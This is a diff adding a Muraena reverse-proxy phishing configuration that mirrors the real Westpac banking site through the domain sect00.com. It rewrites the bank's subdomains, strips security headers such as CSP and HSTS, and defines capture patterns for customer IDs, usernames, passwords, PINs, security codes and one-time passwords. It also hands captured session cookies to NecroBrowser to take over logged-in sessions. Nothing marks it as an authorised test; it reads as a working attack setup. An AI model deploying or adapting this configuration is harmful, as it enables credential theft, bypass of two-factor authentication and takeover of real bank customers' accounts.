@@ -1,0 +1,143 @@
+[proxy]
+phishing = "sect00.com"
+destination = "westpac.com.au"
+IP = "0.0.0.0"
+listener = "0.0.0.0:443"
+
+[proxy.HTTPtoHTTPS]
+enable = true
+HTTPport = 80
+
+[log]
+enable = true
+filePath = "/home/ubuntu/muraena/muraena.log"
+
+[tls]
+enable = true
+expand = false
+certificate = "/etc/letsencrypt/live/sect00.com/fullchain.pem"
+key = "/etc/letsencrypt/live/sect00.com/privkey.pem"
+root = "/etc/letsencrypt/live/sect00.com/fullchain.pem"
+minVersion = "TLS1.2"
+
+[origins]
+externalOriginPrefix = "ext-"
+externalOrigins = [
+    "fonts.googleapis.com",
+    "fonts.gstatic.com",
+    "www.googletagmanager.com",
+    "www.google-analytics.com",
+    "ajax.googleapis.com",
+    "assets.westpac.com.au",
+    "static.westpac.com.au",
+    "cdn.westpac.com.au",
+]
+
+[transform.base64]
+enable = false
+
+[transform.request]
+headers = ["Host", "Origin", "Referer"]
+
+[transform.response]
+skipContentType = ["font/*", "image/*"]
+headers = ["Location", "Content-Security-Policy"]
+
+customContent = [
+    ["westpac.com.au", "{{.PhishingDomain}}"],
+    ["www.westpac.com.au", "www.{{.PhishingDomain}}"],
+    ["online.westpac.com.au", "online.{{.PhishingDomain}}"],
+    ["banking.westpac.com.au", "banking.{{.PhishingDomain}}"],
+    ["api.westpac.com.au", "api.{{.PhishingDomain}}"],
+    ["mobile.westpac.com.au", "mobile.{{.PhishingDomain}}"],
+]
+
+[transform.response.remove]
+headers = [
+    "Content-Security-Policy",
+    "X-Content-Type-Options",
+    "X-Frame-Options",
+    "Strict-Transport-Security",
+    "X-XSS-Protection"
+]
+
+[tracking]
+enable = true
+
+[tracking.trace]
+identifier = "_gat"
+validator = "[a-zA-Z0-9]{5}"
+
+[tracking.trace.landing]
+type = "query"
+
+[tracking.secrets]
+paths = ["/wbc/banking/handler", "/esis/Login/SrvPage", "/initiatesecurelogin", "/login", "/authenticate", "/secure/banking/administration", ]
+
+
+[[tracking.secrets.patterns]]
+label = "Customer ID"
+start = "customer_id="
+end = "&"
+
+[[tracking.secrets.patterns]]
+label = "CustomerID"
+start = "customerId="
+end = "&"
+
+[[tracking.secrets.patterns]]
+label = "Username"
+start = "username="
+end = "&"
+
+[[tracking.secrets.patterns]]
+label = "Password"
+start = "password="
+end = "&"
+
+[[tracking.secrets.patterns]]
+label = "PIN"
+start = "pin="
+end = "&"
+
+[[tracking.secrets.patterns]]
+label = "Security Code"
+start = "code="
+end = "&"
+
+[[tracking.secrets.patterns]]
+label = "OTP"
+start = "otp="
+end = "&"
+
+[[tracking.secrets.patterns]]
+label = "CustomerID_JSON"
+start = ""customer_id":""
+end = """
+
+[[tracking.secrets.patterns]]
+label = "Password_JSON"
+start = ""password":""
+end = """
+
+
+[crawler]
+enable = false
+
+[redis]
+enable = true
+host = "127.0.0.1"
+port = 6379
+
+[necrobrowser]
+enable = true
+endpoint = "http://127.0.0.1:3000/instrument"
+profile = "/home/ubuntu/necrobrowser/config.toml"
+
+[necrobrowser.urls]
+authSession = ["/wbc/banking/dashboard", "/account/summary", "/balances", "/accounts", "/secure/banking/overview", ]
+
+[necrobrowser.trigger]
+type = "cookie"
+values = ["session", "auth_token", "JSESSIONID", "WBC_SESSION", "access_token", "WBC_AUTH", "wbc_auth", "session_token", "CUSTOMERID", ]
+delay = 5
